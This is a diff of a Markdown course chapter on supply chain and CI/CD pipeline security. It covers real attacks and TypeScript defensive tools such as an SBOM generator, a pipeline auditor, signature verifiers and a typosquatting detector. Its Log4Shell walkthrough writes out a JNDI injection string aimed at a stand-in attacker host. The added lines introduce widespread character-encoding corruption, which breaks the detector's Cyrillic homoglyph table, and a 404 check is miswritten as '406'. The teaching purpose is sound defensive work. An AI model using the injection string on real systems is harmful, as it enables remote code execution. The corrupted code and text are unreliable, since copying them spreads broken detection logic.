@@ -1,4 +1,4 @@
-# Chapter 16: Supply Chain & CI/CD Pipeline Security
+﻿# Chapter 16: Supply Chain & CI/CD Pipeline Security
 
 ---
 
@@ -9,16 +9,16 @@ By the end of this chapter, you will be able to:
 <!-- Image Gallery -->
 <section class="lesson-visuals" aria-label="Visual learning resources">
   <header><span>VISUAL LEARNING</span><h2>See it. Review it. Remember it.</h2></header>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/16-supply-chain-cicd/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/16-supply-chain-cicd/.png" alt="Handwritten notes" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/16-supply-chain-cicd/handwritten-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/16-supply-chain-cicd/handwritten-notes.png" alt="Handwritten notes" loading="lazy">
     <span><strong>Handwritten notes</strong>Condensed notes for deliberate review.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/16-supply-chain-cicd/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/16-supply-chain-cicd/.png" alt="Sticky-note revision" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/16-supply-chain-cicd/sticky-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/16-supply-chain-cicd/sticky-notes.png" alt="Sticky-note revision" loading="lazy">
     <span><strong>Sticky-note revision</strong>Fast recall prompts for revision.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/16-supply-chain-cicd/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/16-supply-chain-cicd/.png" alt="Visual concept guide" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/16-supply-chain-cicd/visual-explanation.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/16-supply-chain-cicd/visual-explanation.png" alt="Visual concept guide" loading="lazy">
     <span><strong>Visual concept guide</strong>A connected explanation of the key ideas.</span>
   </a>
 </section>
@@ -30,7 +30,7 @@ By the end of this chapter, you will be able to:
 4. **Harden** CI/CD pipelines against common attack vectors including secret leakage, runner compromise, and dependency confusion.
 5. **Apply** artifact integrity verification using Sigstore, Cosign, and TUF.
 6. **Integrate** DevSecOps tooling (SAST, DAST, secrets scanning, container scanning) into automated pipelines.
-7. **Implement** SLSA provenance attestation at various maturity levels (L0–L4).
+7. **Implement** SLSA provenance attestation at various maturity levels (L0â€“L4).
 8. **Build** TypeScript utilities for SBOM generation, vulnerability auditing, pipeline security auditing, and dependency confusion detection.
 
 ---
@@ -72,9 +72,9 @@ flowchart LR
 
 ---
 
-## 16.2 Major Supply Chain Attacks — Technical Deep Dive
+## 16.2 Major Supply Chain Attacks â€” Technical Deep Dive
 
-### 16.2.1 SolarWinds (Sunburst) Attack — 2020
+### 16.2.1 SolarWinds (Sunburst) Attack â€” 2020
 
 The SolarWinds attack remains the most sophisticated software supply chain compromise in history. Attackers affiliated with APT29 (Cozy Bear) compromised SolarWinds' build infrastructure and inserted a backdoor into Orion software updates.
 
@@ -85,7 +85,7 @@ The SolarWinds attack remains the most sophisticated software supply chain compr
 2. **Build pipeline injection**: Malicious code was inserted into the `Orion.Core.BusinessLayer.dll` assembly during the build process. The attackers modified the source code in SolarWinds' build environment to include a backdoor component.
 
 3. **The Sunburst backdoor**: The injected code used a domain generation algorithm (DGA) to beacon to command-and-control (C2) servers. The code was designed to:
-   - Sleep for 12–14 days before beaconing (evading sandbox detection).
+   - Sleep for 12â€“14 days before beaconing (evading sandbox detection).
    - Use multiple C2 domains with DNS-based communication.
    - Accept "jobs" (arbitrary code execution) delivered via DNS responses.
    - Employ multiple anti-analysis techniques including C2 domain hashing and delayed activation.
@@ -101,7 +101,7 @@ The SolarWinds attack remains the most sophisticated software supply chain compr
 - Supply chain monitoring must include behavioral analysis, not just signature verification.
 - SBOMs would have allowed organizations to rapidly identify if they were using Orion.
 
-### 16.2.2 Codecov Breach — 2021
+### 16.2.2 Codecov Breach â€” 2021
 
 In April 2021, attackers modified the Codecov Bash Uploader script to exfiltrate environment variables from CI/CD pipelines.
 
@@ -126,7 +126,7 @@ flowchart LR
 - Affected companies included Confluent, HashiCorp, and Twilio.
 - The breach demonstrated that even security tools can become attack vectors.
 
-### 16.2.3 Log4j (Log4Shell) — CVE-2021-44228
+### 16.2.3 Log4j (Log4Shell) â€” CVE-2021-44228
 
 The Log4j vulnerability is a critical remote code execution (RCE) flaw in the Apache Log4j 2 Java logging library. While not a supply chain attack in the traditional sense, its impact was amplified by the software supply chain.
 
@@ -134,15 +134,15 @@ The Log4j vulnerability is a critical remote code execution (RCE) flaw in the Ap
 
 ```
 1. User input: ${jndi:ldap://attacker.com/evil-class}
-   ↓
+   â†“
 2. Log4j parses JNDI lookup in log message
-   ↓
+   â†“
 3. JNDI lookup resolves via LDAP to attacker-controlled server
-   ↓
+   â†“
 4. Attacker server responds with serialized Java class
-   ↓
+   â†“
 5. Log4j deserializes and executes arbitrary code
-   ↓
+   â†“
 6. Complete system compromise
 ```
 
@@ -240,7 +240,7 @@ const verdict1 = simulateDependencyConfusion(
   'internal-auth-lib',
   '1.2.0',
   '99.0.0', // Attacker published this high version publicly
-  false     // No npm scope configured — VULNERABLE
+  false     // No npm scope configured â€” VULNERABLE
 );
 console.log('[Dependency Confusion]', verdict1);
 // Output: riskLevel: 'CRITICAL', resolvedFrom: 'public'
@@ -249,7 +249,7 @@ const verdict2 = simulateDependencyConfusion(
   '@company/internal-auth-lib',
   '1.2.0',
   '99.0.0',
-  true // Scoped package — SAFE
+  true // Scoped package â€” SAFE
 );
 console.log('[Scoped Package Safe]', verdict2);
 // Output: riskLevel: 'LOW', resolvedFrom: 'private'
@@ -261,11 +261,11 @@ Attackers publish packages with names that are slight misspellings of popular pa
 
 | Legitimate Package | Typosquatted Variant | Impact |
 |---|---|---|
-| `lodash` | `l0dash` (letter O → zero) | Data exfiltration |
+| `lodash` | `l0dash` (letter O â†’ zero) | Data exfiltration |
 | `babel-core` | `bable-core` | Credential theft |
 | `node-fetch` | `node-fetch` (hidden zero-width chars) | Arbitrary code execution |
 | `cross-env` | `cross-env` (Unicode homoglyph) | Environment variable theft |
-| `request` | `request` (deprecated — malware found in abandoned packages) | Credential harvesting |
+| `request` | `request` (deprecated â€” malware found in abandoned packages) | Credential harvesting |
 
 **Malicious package detection approach:**
 
@@ -294,14 +294,14 @@ class TyposquattingDetector {
       ['1', 'l'], ['I', 'l'], ['l', 'i'],
       ['5', 's'], ['S', 's'],
       ['8', 'b'], ['B', 'b'],
-      ['ё', 'е'], ['é', 'e'], ['è', 'e'],
-      ['а', 'a'], // Cyrillic 'а'
-      ['с', 'c'], // Cyrillic 'с'
-      ['е', 'e'], // Cyrillic 'e'
-      ['о', 'o'], // Cyrillic 'o'
-      ['р', 'p'], // Cyrillic 'p'
-      ['х', 'x'], // Cyrillic 'х'
-      ['і', 'i'], // Cyrillic 'i'
+      ['Ñ‘', 'Ðµ'], ['Ã©', 'e'], ['Ã¨', 'e'],
+      ['Ð°', 'a'], // Cyrillic 'Ð°'
+      ['Ñ', 'c'], // Cyrillic 'Ñ'
+      ['Ðµ', 'e'], // Cyrillic 'e'
+      ['Ð¾', 'o'], // Cyrillic 'o'
+      ['Ñ€', 'p'], // Cyrillic 'p'
+      ['Ñ…', 'x'], // Cyrillic 'Ñ…'
+      ['Ñ–', 'i'], // Cyrillic 'i'
     ]);
   }
 
@@ -422,7 +422,7 @@ const detector = new TyposquattingDetector([
   'mongoose', 'axios', 'chalk', 'commander', 'async',
 ]);
 
-const scans = ['l0dash', 'bable-core', 'express', 'async', 'ax10s', 'mοngoose'];
+const scans = ['l0dash', 'bable-core', 'express', 'async', 'ax10s', 'mÎ¿ngoose'];
 for (const pkg of scans) {
   console.log(detector.scan(pkg));
 }
@@ -456,7 +456,7 @@ import * as fs from 'fs';
 import * as path from 'path';
 import { createHash } from 'crypto';
 
-/* ─── Type Definitions ─── */
+/* â”€â”€â”€ Type Definitions â”€â”€â”€ */
 
 interface PackageJson {
   name: string;
@@ -505,7 +505,7 @@ interface CycloneDXDependency {
   dependsOn: string[];
 }
 
-/* ─── SBOM Generator ─── */
+/* â”€â”€â”€ SBOM Generator â”€â”€â”€ */
 
 class CycloneDXSBOMGenerator {
   private readonly projectRoot: string;
@@ -779,7 +779,7 @@ class CycloneDXSBOMGenerator {
   }
 }
 
-// ─── Usage ───
+// â”€â”€â”€ Usage â”€â”€â”€
 // const generator = new CycloneDXSBOMGenerator('/path/to/project');
 // const sbom = generator.generate();
 // fs.writeFileSync('bom.cyclonedx.json', JSON.stringify(sbom, null, 2));
@@ -893,7 +893,7 @@ class CycloneDXValidator {
  * connect to the NVD API or use a local OWASP Dependency Check DB.
  */
 
-/* ─── Type Definitions ─── */
+/* â”€â”€â”€ Type Definitions â”€â”€â”€ */
 
 interface VulnerabilityRecord {
   id: string;
@@ -932,7 +932,7 @@ interface ScanReport {
   };
 }
 
-/* ─── Version Comparator ─── */
+/* â”€â”€â”€ Version Comparator â”€â”€â”€ */
 
 class VersionComparator {
   /**
@@ -1002,7 +1002,7 @@ class VersionComparator {
   }
 }
 
-/* ─── Vulnerability Checker ─── */
+/* â”€â”€â”€ Vulnerability Checker â”€â”€â”€ */
 
 class DependencyVulnerabilityChecker {
   private readonly cveDatabase: VulnerabilityRecord[];
@@ -1053,7 +1053,7 @@ class DependencyVulnerabilityChecker {
   }
 }
 
-// ─── Demonstration ───
+// â”€â”€â”€ Demonstration â”€â”€â”€
 
 const sampleCVE: VulnerabilityRecord[] = [
   {
@@ -1088,7 +1088,7 @@ const sampleCVE: VulnerabilityRecord[] = [
     packageName: 'xz-utils',
     affectedVersions: '>=5.6.0 <5.6.1',
     severity: 'CRITICAL',
-    description: 'xz backdoor — malicious code in upstream tarballs',
+    description: 'xz backdoor â€” malicious code in upstream tarballs',
     cvssScore: 10.0,
     fixVersion: '5.6.1',
   },
@@ -1206,7 +1206,7 @@ flowchart LR
     subgraph Source
         A[Git Repository]
     end
-    subgraph CI_Pipeline["CI Pipeline — Security Gates"]
+    subgraph CI_Pipeline["CI Pipeline â€” Security Gates"]
         B[SAST Scan]
         C[Secrets Scan]
         D[SBOM Generation]
@@ -1217,7 +1217,7 @@ flowchart LR
         G[Build & Sign]
         H[Provenance Attestation]
     end
-    subgraph CD_Pipeline["CD Pipeline — Deployment Gates"]
+    subgraph CD_Pipeline["CD Pipeline â€” Deployment Gates"]
         I[Artifact Verification]
         J[Policy Enforcement]
         K[Canary Deploy]
@@ -1261,7 +1261,7 @@ flowchart LR
  * Supports GitHub Actions (YAML), GitLab CI (.gitlab-ci.yml), and generic checks.
  */
 
-/* ─── Type Definitions ─── */
+/* â”€â”€â”€ Type Definitions â”€â”€â”€ */
 
 type PipelineType = 'github-actions' | 'gitlab-ci' | 'jenkins' | 'generic';
 
@@ -1294,7 +1294,7 @@ interface AuditReport {
   };
 }
 
-/* ─── Security Audit Rules ─── */
+/* â”€â”€â”€ Security Audit Rules â”€â”€â”€ */
 
 interface AuditRule {
   id: string;
@@ -1388,7 +1388,7 @@ class CICDPipelineAuditor {
 
           if (isDeployJob && !hasWrite) {
             // Deploy job without explicit permissions might default to write
-            // — GitHub Actions defaults differ by trigger event
+            // â€” GitHub Actions defaults differ by trigger event
             if (config.rawContent.includes('pull_request_target')) {
               findings.push({
                 severity: 'CRITICAL',
@@ -1560,7 +1560,7 @@ class CICDPipelineAuditor {
   }
 }
 
-// ─── Demonstration ───
+// â”€â”€â”€ Demonstration â”€â”€â”€
 
 const sampleWorkflow = `
 name: Production Deploy
@@ -1610,7 +1610,7 @@ console.log(`  Passed: ${report.summary.passed}`);
 console.log('\nFindings:');
 for (const finding of report.findings) {
   console.log(`  [${finding.severity}] ${finding.rule}: ${finding.description}`);
-  console.log(`    → ${finding.recommendation}`);
+  console.log(`    â†’ ${finding.recommendation}`);
 }
 ```
 
@@ -1618,26 +1618,26 @@ for (const finding of report.findings) {
 
 | # | Check | Priority | Pipeline Type |
 |---|---|---|---|
-| 1 | **Pin all actions to commit SHAs** — never use version tags | Critical | GitHub Actions |
-| 2 | **Set minimum token permissions** — `permissions: read-all` at workflow level | Critical | GitHub Actions |
+| 1 | **Pin all actions to commit SHAs** â€” never use version tags | Critical | GitHub Actions |
+| 2 | **Set minimum token permissions** â€” `permissions: read-all` at workflow level | Critical | GitHub Actions |
 | 3 | **Use `pull_request` not `pull_request_target`** for untrusted forks | Critical | GitHub Actions |
-| 4 | **Ephemeral runners only** — never reuse runners between builds | Critical | All |
-| 5 | **No Docker socket mounts** — use dind or rootless Docker | Critical | All |
-| 6 | **Secrets scanning pre-commit** — `trufflehog`, `gitleaks` | Critical | All |
-| 7 | **SBOM generation per build** — CycloneDX or SPDX | High | All |
-| 8 | **Artifact signing** — Cosign or GPG | High | All |
-| 9 | **Dependency scanning** — `npm audit`, `snyk`, OWASP DC | High | All |
-| 10 | **SAST integration** — CodeQL, Semgrep | High | All |
-| 11 | **Container scanning** — Trivy, Grype | High | All |
-| 12 | **No hardcoded secrets** — use CI secrets vault | Critical | All |
-| 13 | **Separate build and deploy workflows** — principle of least privilege | High | All |
-| 14 | **Provenance attestation** — in-toto + SLSA | Medium | All |
-| 15 | **DAST for deployed artifacts** — ZAP, Burp Suite | Medium | All |
-| 16 | **Signed commits and tags** — GPG or SSH commit signing | Medium | Git |
-| 17 | **Branch protection rules** — require PRs, status checks, signed commits | Critical | Git |
-| 18 | **No CI variable exposure in logs** — mask secrets | High | All |
-| 19 | **Rate limit and bill monitoring** — detect cryptomining use | Medium | All |
-| 20 | **Regular rotation of CI secrets** — automate with tools | High | All |
+| 4 | **Ephemeral runners only** â€” never reuse runners between builds | Critical | All |
+| 5 | **No Docker socket mounts** â€” use dind or rootless Docker | Critical | All |
+| 6 | **Secrets scanning pre-commit** â€” `trufflehog`, `gitleaks` | Critical | All |
+| 7 | **SBOM generation per build** â€” CycloneDX or SPDX | High | All |
+| 8 | **Artifact signing** â€” Cosign or GPG | High | All |
+| 9 | **Dependency scanning** â€” `npm audit`, `snyk`, OWASP DC | High | All |
+| 10 | **SAST integration** â€” CodeQL, Semgrep | High | All |
+| 11 | **Container scanning** â€” Trivy, Grype | High | All |
+| 12 | **No hardcoded secrets** â€” use CI secrets vault | Critical | All |
+| 13 | **Separate build and deploy workflows** â€” principle of least privilege | High | All |
+| 14 | **Provenance attestation** â€” in-toto + SLSA | Medium | All |
+| 15 | **DAST for deployed artifacts** â€” ZAP, Burp Suite | Medium | All |
+| 16 | **Signed commits and tags** â€” GPG or SSH commit signing | Medium | Git |
+| 17 | **Branch protection rules** â€” require PRs, status checks, signed commits | Critical | Git |
+| 18 | **No CI variable exposure in logs** â€” mask secrets | High | All |
+| 19 | **Rate limit and bill monitoring** â€” detect cryptomining use | Medium | All |
+| 20 | **Regular rotation of CI secrets** â€” automate with tools | High | All |
 
 ---
 
@@ -1660,7 +1660,7 @@ Sigstore is a set of tools for signing, verifying, and protecting software artif
  * - Rekor transparency log lookup
  */
 
-/* ─── Type Definitions ─── */
+/* â”€â”€â”€ Type Definitions â”€â”€â”€ */
 
 interface SignatureMetadata {
   imageRef: string;
@@ -1691,7 +1691,7 @@ interface CosignPolicy {
 
 type SignatureAlgorithm = 'ECDSA-P256' | 'ECDSA-P384' | 'RSA-PSS-2048' | 'RSA-PSS-4096';
 
-/* ─── Cryptographic Helpers ─── */
+/* â”€â”€â”€ Cryptographic Helpers â”€â”€â”€ */
 
 class CryptoUtils {
   /**
@@ -1747,7 +1747,7 @@ class CryptoUtils {
   }
 }
 
-/* ─── Rekor Transparency Log ─── */
+/* â”€â”€â”€ Rekor Transparency Log â”€â”€â”€ */
 
 class RekorClient {
   private readonly baseURL: string;
@@ -1786,7 +1786,7 @@ class RekorClient {
   }
 }
 
-/* ─── Cosign Verifier ─── */
+/* â”€â”€â”€ Cosign Verifier â”€â”€â”€ */
 
 class CosignVerifier {
   private readonly cryptoUtils: CryptoUtils;
@@ -1930,7 +1930,7 @@ AQoCggEBAK0A/2h2i0m+Im1e7s9j0q8V5hf0v8JhZnDx0Bf+9cG2LIDjG/Pq
   }
 }
 
-// ─── Demonstration ───
+// â”€â”€â”€ Demonstration â”€â”€â”€
 
 async function demonstrateCosignVerification(): Promise<void> {
   const verifier = new CosignVerifier();
@@ -1948,7 +1948,7 @@ async function demonstrateCosignVerification(): Promise<void> {
   console.log(`Errors: ${result.errors.length > 0 ? result.errors.join(', ') : 'None'}`);
 
   if (result.verified) {
-    console.log('✓ Signature is valid and trusted');
+    console.log('âœ“ Signature is valid and trusted');
   }
 }
 
@@ -1968,7 +1968,7 @@ void demonstrateCosignVerification();
 import * as fs from 'fs';
 import { createHash } from 'crypto';
 
-/* ─── Type Definitions ─── */
+/* â”€â”€â”€ Type Definitions â”€â”€â”€ */
 
 type HashAlgorithm = 'sha256' | 'sha512' | 'sha1' | 'md5';
 
@@ -1998,7 +1998,7 @@ interface ArtifactVerificationResult {
   errors: string[];
 }
 
-/* ─── Artifact Verifier ─── */
+/* â”€â”€â”€ Artifact Verifier â”€â”€â”€ */
 
 class ArtifactHashVerifier {
   private readonly SUPPORTED_ALGORITHMS: HashAlgorithm[] = ['sha256', 'sha512', 'sha1', 'md5'];
@@ -2147,12 +2147,12 @@ class ArtifactHashVerifier {
   }
 }
 
-// ─── Demonstration ───
+// â”€â”€â”€ Demonstration â”€â”€â”€
 
 function demonstrateArtifactVerification(): void {
   const verifier = new ArtifactHashVerifier();
 
-  // Simulate — in real usage, would be an actual file
+  // Simulate â€” in real usage, would be an actual file
   const testFilePath = './dist/app-bundle.js';
   
   // Create a test file for demonstration
@@ -2173,7 +2173,7 @@ function demonstrateArtifactVerification(): void {
   console.log(`Verified: ${result.verified}`);
   console.log(`Checks:`);
   for (const check of result.checks) {
-    const icon = check.match ? '✓' : '✗';
+    const icon = check.match ? 'âœ“' : 'âœ—';
     console.log(`  ${icon} ${check.type === 'hash' ? check.algorithm?.toUpperCase() : 'SIZE'}: ${check.expected}`);
     console.log(`    Expected: ${check.expected}`);
     console.log(`    Actual:   ${check.actual}`);
@@ -2191,7 +2191,7 @@ demonstrateArtifactVerification();
 
 ---
 
-## 16.7 SLSA — Supply Chain Levels for Software Artifacts
+## 16.7 SLSA â€” Supply Chain Levels for Software Artifacts
 
 SLSA (pronounced "salsa") is a security framework from Google that specifies a graduated set of security levels for software supply chain integrity.
 
@@ -2199,30 +2199,30 @@ SLSA (pronounced "salsa") is a security framework from Google that specifies a g
 
 ```mermaid
 flowchart TB
-    subgraph SLSA_L0["SLSA L0 — No guarantees"]
+    subgraph SLSA_L0["SLSA L0 â€” No guarantees"]
         A0[Any build process]
         A0 -->|No provenance| A0e[No security guarantees]
     end
 
-    subgraph SLSA_L1["SLSA L1 — Basic provenance"]
+    subgraph SLSA_L1["SLSA L1 â€” Basic provenance"]
         B1[Build process]
         B1 -->|Provenance generated| P1[Provenance: who, what, when]
         P1 -->|Not verified| B1e[Minimal protection]
     end
 
-    subgraph SLSA_L2["SLSA L2 — Tamper resistance"]
+    subgraph SLSA_L2["SLSA L2 â€” Tamper resistance"]
         C2[Hosted build platform]
         C2 -->|Signed provenance| P2[Provenance: signed by platform]
         P2 -->|Isolated builds| C2e[Resistant to tampering]
     end
 
-    subgraph SLSA_L3["SLSA L3 — Hardened builds"]
+    subgraph SLSA_L3["SLSA L3 â€” Hardened builds"]
         D3[Hardened build platform]
         D3 -->|No user-defined steps| P3[Provenance: full dependency tree]
         P3 -->|Hermetic + Reproducible| D3e[Maximum integrity]
     end
 
-    subgraph SLSA_L4["SLSA L4 — Maximum security"]
+    subgraph SLSA_L4["SLSA L4 â€” Maximum security"]
         E4[Two-person review]
         E4 -->|All of L3 + audits| P4[Provenance: peer-reviewed]
         P4 -->|Security audit + FIPS| E4e[Highest assurance]
@@ -2240,16 +2240,16 @@ flowchart TB
 
 | Requirement | L1 | L2 | L3 | L4 |
 |---|---|---|---|---|
-| Provenance exists | ✓ | ✓ | ✓ | ✓ |
-| Provenance is authenticated | | ✓ | ✓ | ✓ |
-| Provenance is non-forgeable | | | ✓ | ✓ |
-| Build service is hosted | | ✓ | ✓ | ✓ |
-| Build is isolated | | | ✓ | ✓ |
-| Build is hermetic | | | ✓ | ✓ |
-| Build is reproducible | | | | ✓ |
-| Dependencies are enumerated | | | ✓ | ✓ |
-| Two-person review | | | | ✓ |
-| Security audit | | | | ✓ |
+| Provenance exists | âœ“ | âœ“ | âœ“ | âœ“ |
+| Provenance is authenticated | | âœ“ | âœ“ | âœ“ |
+| Provenance is non-forgeable | | | âœ“ | âœ“ |
+| Build service is hosted | | âœ“ | âœ“ | âœ“ |
+| Build is isolated | | | âœ“ | âœ“ |
+| Build is hermetic | | | âœ“ | âœ“ |
+| Build is reproducible | | | | âœ“ |
+| Dependencies are enumerated | | | âœ“ | âœ“ |
+| Two-person review | | | | âœ“ |
+| Security audit | | | | âœ“ |
 
 ### 16.7.3 SLSA Provenance Attestation Builder (TypeScript)
 
@@ -2263,7 +2263,7 @@ flowchart TB
  * Reference: https://slsa.dev/provenance/v1
  */
 
-/* ─── Type Definitions ─── */
+/* â”€â”€â”€ Type Definitions â”€â”€â”€ */
 
 interface SLSAProvenanceV1 {
   type: 'https://slsa.dev/provenance/v1';
@@ -2316,7 +2316,7 @@ interface SLSAConfig {
   }>;
 }
 
-/* ─── Provenance Builder ─── */
+/* â”€â”€â”€ Provenance Builder â”€â”€â”€ */
 
 class SLSAProvenanceBuilder {
   /**
@@ -2378,7 +2378,7 @@ class SLSAProvenanceBuilder {
     }
 
     if (config.level >= 3) {
-      // L3+: Hermetic build — enumerate all dependencies
+      // L3+: Hermetic build â€” enumerate all dependencies
       attestation.predicate.buildDefinition.internalParameters = {
         hermetic: true,
         isolated: true,
@@ -2386,7 +2386,7 @@ class SLSAProvenanceBuilder {
     }
 
     if (config.level >= 4) {
-      // L4+: Two-person review — include review metadata
+      // L4+: Two-person review â€” include review metadata
       attestation.predicate.buildDefinition.internalParameters = {
         ...attestation.predicate.buildDefinition.internalParameters,
         twoPersonReview: true,
@@ -2479,7 +2479,7 @@ class SLSAProvenanceBuilder {
   }
 }
 
-// ─── Demonstration ───
+// â”€â”€â”€ Demonstration â”€â”€â”€
 
 function demonstrateSLSABuilder(): void {
   const builder = new SLSAProvenanceBuilder();
@@ -2520,9 +2520,9 @@ function demonstrateSLSABuilder(): void {
   const violations = builder.verifyLevelRequirements(config);
   if (violations.length > 0) {
     console.log('\nRequirement Violations:');
-    violations.forEach((v) => console.log(`  ✗ ${v}`));
+    violations.forEach((v) => console.log(`  âœ— ${v}`));
   } else {
-    console.log('✓ All requirements met');
+    console.log('âœ“ All requirements met');
   }
 
   // Generate attestation
@@ -2611,7 +2611,7 @@ flowchart LR
 import * as https from 'https';
 import * as http from 'http';
 
-/* ─── Type Definitions ─── */
+/* â”€â”€â”€ Type Definitions â”€â”€â”€ */
 
 interface PackageInfo {
   name: string;
@@ -2644,7 +2644,7 @@ interface DependencyConfusionReport {
   };
 }
 
-/* ─── Registry Checker ─── */
+/* â”€â”€â”€ Registry Checker â”€â”€â”€ */
 
 class DependencyConfusionScanner {
   private readonly publicRegistries: string[];
@@ -2721,7 +2721,7 @@ class DependencyConfusionScanner {
       }
       return { exists: false, latestVersion: null };
     } catch (error) {
-      // 404 or network error — package doesn't exist publicly
+      // 404 or network error â€” package doesn't exist publicly
       if (error instanceof Error && error.message.includes('406')) {
         return { exists: false, latestVersion: null };
       }
@@ -2798,7 +2798,7 @@ class DependencyConfusionScanner {
           existsInRegistry: false,
           latestVersion: null,
           riskLevel: 'NONE',
-          details: 'Scoped package — dependency confusion not applicable if scope is configured to private registry.',
+          details: 'Scoped package â€” dependency confusion not applicable if scope is configured to private registry.',
         });
         continue;
       }
@@ -2807,7 +2807,7 @@ class DependencyConfusionScanner {
       const publicInfo = await this.checkNPMPackage(pkg.name);
 
       if (publicInfo.exists) {
-        // Package exists publicly — this is the confusion risk
+        // Package exists publicly â€” this is the confusion risk
         const riskLevel = isLikelyPrivate ? 'CRITICAL' : 'HIGH';
         results.push({
           packageName: pkg.name,
@@ -2823,7 +2823,7 @@ class DependencyConfusionScanner {
               `use a scope (@scope/package) and configure .npmrc.`,
         });
       } else {
-        // Package does not exist publicly — no confusion risk
+        // Package does not exist publicly â€” no confusion risk
         results.push({
           packageName: pkg.name,
           registryURL: 'https://registry.npmjs.org',
@@ -2857,7 +2857,7 @@ class DependencyConfusionScanner {
   }
 }
 
-// ─── Demonstrations ───
+// â”€â”€â”€ Demonstrations â”€â”€â”€
 
 async function demonstrateDependencyConfusionScanner(): Promise<void> {
   const scanner = new DependencyConfusionScanner({
@@ -2929,23 +2929,23 @@ void demonstrateDependencyConfusionScanner();
 
 This chapter covered the critical topic of software supply chain and CI/CD pipeline security:
 
-1. **Supply Chain Attacks** — We analyzed real-world attacks including SolarWinds (Sunburst), Codecov, Log4j, dependency confusion, and typosquatting. These attacks demonstrate that the software supply chain is a high-value target where compromising one upstream component can cascade to thousands of downstream consumers.
+1. **Supply Chain Attacks** â€” We analyzed real-world attacks including SolarWinds (Sunburst), Codecov, Log4j, dependency confusion, and typosquatting. These attacks demonstrate that the software supply chain is a high-value target where compromising one upstream component can cascade to thousands of downstream consumers.
 
-2. **SBOM (Software Bill of Materials)** — SBOMs provide a machine-readable inventory of all software components. We implemented a CycloneDX SBOM generator that parses `package.json` and `node_modules` to produce a structured document. Tools like Syft, Trivy, and CycloneDX CLI automate SBOM generation.
+2. **SBOM (Software Bill of Materials)** â€” SBOMs provide a machine-readable inventory of all software components. We implemented a CycloneDX SBOM generator that parses `package.json` and `node_modules` to produce a structured document. Tools like Syft, Trivy, and CycloneDX CLI automate SBOM generation.
 
-3. **Dependency Security** — We built a dependency vulnerability checker that compares dependencies against a CVE database. We covered tools like `npm audit`, OWASP Dependency Check, Snyk, and GitHub Dependabot. Transitive dependencies represent a significant blind spot that requires deep dependency graph analysis.
+3. **Dependency Security** â€” We built a dependency vulnerability checker that compares dependencies against a CVE database. We covered tools like `npm audit`, OWASP Dependency Check, Snyk, and GitHub Dependabot. Transitive dependencies represent a significant blind spot that requires deep dependency graph analysis.
 
-4. **CI/CD Pipeline Hardening** — We implemented a CI/CD pipeline security auditor that checks for common misconfigurations including unpinned actions, missing permission scoping, hardcoded secrets, Docker socket mounts, and missing SBOM generation. The CI/CD hardening checklist provided 20 actionable security controls.
+4. **CI/CD Pipeline Hardening** â€” We implemented a CI/CD pipeline security auditor that checks for common misconfigurations including unpinned actions, missing permission scoping, hardcoded secrets, Docker socket mounts, and missing SBOM generation. The CI/CD hardening checklist provided 20 actionable security controls.
 
-5. **Artifact Integrity** — We explored Sigstore/Cosign for container signing and verification, and implemented a software artifact hash verifier. These tools ensure that artifacts haven't been tampered with between build and deployment.
+5. **Artifact Integrity** â€” We explored Sigstore/Cosign for container signing and verification, and implemented a software artifact hash verifier. These tools ensure that artifacts haven't been tampered with between build and deployment.
 
-6. **SLSA Framework** — We implemented a SLSA provenance attestation builder that generates in-toto attestations conforming to SLSA v1. The SLSA model provides a graduated path from no guarantees (L0) to maximum security (L4) with two-person review and reproducibility.
+6. **SLSA Framework** â€” We implemented a SLSA provenance attestation builder that generates in-toto attestations conforming to SLSA v1. The SLSA model provides a graduated path from no guarantees (L0) to maximum security (L4) with two-person review and reproducibility.
 
-7. **DevSecOps Integration** — We covered the integration of SAST, DAST, secrets scanning, container scanning, and fuzzing into CI/CD pipelines. The dependency confusion scanner demonstrated how to proactively identify one of the most common supply chain risks.
+7. **DevSecOps Integration** â€” We covered the integration of SAST, DAST, secrets scanning, container scanning, and fuzzing into CI/CD pipelines. The dependency confusion scanner demonstrated how to proactively identify one of the most common supply chain risks.
 
 ---
 
-## Chapter Quiz — Supply Chain & CI/CD Pipeline Security
+## Chapter Quiz â€” Supply Chain & CI/CD Pipeline Security
 
 | # | Question | A | B | C | D | Answer |
 |---|----------|---|---|---|---|--------|
@@ -2957,7 +2957,7 @@ This chapter covered the critical topic of software supply chain and CI/CD pipel
 | 6 | What is the purpose of generating a provenance attestation in a CI/CD pipeline? | To measure build performance metrics | To create an auditable record of how an artifact was built, by whom, and from what source | To comply with GDPR data retention requirements | To generate API documentation automatically | **B** |
 | 7 | Which of the following is a valid defense against typosquatting attacks? | Always installing packages with `--save-exact` flag | Using a package allowlist and implementing Levenshtein distance checks on package names | Disabling npm audit in CI/CD pipelines | Only using devDependencies in production builds | **B** |
 | 8 | What is a primary risk of using self-hosted CI/CD runners? | Slower build times compared to cloud runners | Persistent state between builds may leak secrets from previous runs | Self-hosted runners cannot cache dependencies | They cannot run containerized builds | **B** |
-| 9 | What does a "hermetic build" mean in the context of SLSA? | The build runs in an isolated container | The build is fully sealed and does not access the network for any purpose — all dependencies are pre-fetched and verified | The build output is encrypted before storage | The build is reproducible across different operating systems | **B** |
+| 9 | What does a "hermetic build" mean in the context of SLSA? | The build runs in an isolated container | The build is fully sealed and does not access the network for any purpose â€” all dependencies are pre-fetched and verified | The build output is encrypted before storage | The build is reproducible across different operating systems | **B** |
 | 10 | Which of the following is an example of a SAST (Static Application Security Testing) tool? | OWASP ZAP | Trivy | CodeQL | Falco | **C** |
 
 ---
@@ -2975,7 +2975,7 @@ This chapter covered the critical topic of software supply chain and CI/CD pipel
 1. Create a `package.json` with 5+ dependencies (including some with known vulnerabilities).
 2. Extend the `CycloneDXSBOMGenerator` to support outputting SPDX format in addition to CycloneDX.
